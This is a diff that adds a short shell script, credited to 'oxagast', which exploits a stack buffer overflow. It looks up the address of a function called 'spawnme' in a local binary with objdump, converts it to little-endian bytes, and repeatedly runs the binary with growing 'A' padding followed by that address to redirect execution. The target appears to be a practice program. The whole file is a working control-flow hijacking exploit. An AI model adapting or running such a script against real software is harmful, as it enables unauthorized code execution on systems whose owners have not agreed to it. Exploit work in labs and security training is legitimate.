@@ -1,0 +1,19 @@
+### oxagast ###
+
+# jump to an arbitrary function via buffer overflow
+
+
+FUNCTION="spawnme";
+BINARY="./bo";
+OTHEROPTS="a";
+BUFFERLEN=16;
+
+
+BUFOFF=`expr ${BUFFERLEN} + 30`;
+FUNFUN="<${FUNCTION}>:";
+LOC=$(objdump -d ${BINARY} | grep ${FUNCTION} | cut -d ' ' -f 1 | awk '{print gensub(/^0*/,"","")}' 2>/dev/null | fold -w 2 | tac);
+
+REVLOC=$(printf '\\x'%s $LOC);
+for OFFSET in `seq ${BUFOFF}`; do
+    ${BINARY} -A `printf -v str %-${OFFSET}s ' ';echo -n "${str// /A}";printf ${REVLOC}`
+done;
